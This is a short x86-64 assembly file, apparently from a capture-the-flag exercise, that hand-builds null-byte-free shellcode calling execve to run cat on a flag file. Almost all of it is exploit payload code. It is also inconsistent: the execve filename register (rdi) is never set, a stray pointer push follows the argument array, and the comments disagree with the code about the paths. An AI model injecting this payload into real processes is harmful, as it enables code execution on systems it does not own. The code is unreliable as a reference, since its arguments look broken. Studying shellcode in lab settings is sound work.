; create shellcode to read /flag.txt
; /bin/cat /flag.txt

global _start

section .text
_start:
	; execve("/usr/bin/cat", ["/usr/bin/cat", "flag.txt"], NULL)
	; little endian -> 0x1234 is 0x4321
	; f(a,b,c) -> push c push b push a call f
	; cant have null bytes so just xor a register to clear it and push it
        xor rax, rax
	push rax

	mov rsi, "flag.txt"
	push rsi
	mov rsi, rsp

	push rax

	mov rbx, "/bin/cat"
	push rbx
	mov rbx, rsp

	push rax
	push rsi
	push rbx
	mov rsi, rsp

	push rax

	push rbx
	mov rbx, rsp

	mov rdx, rax

	mov rax, 59
	syscall
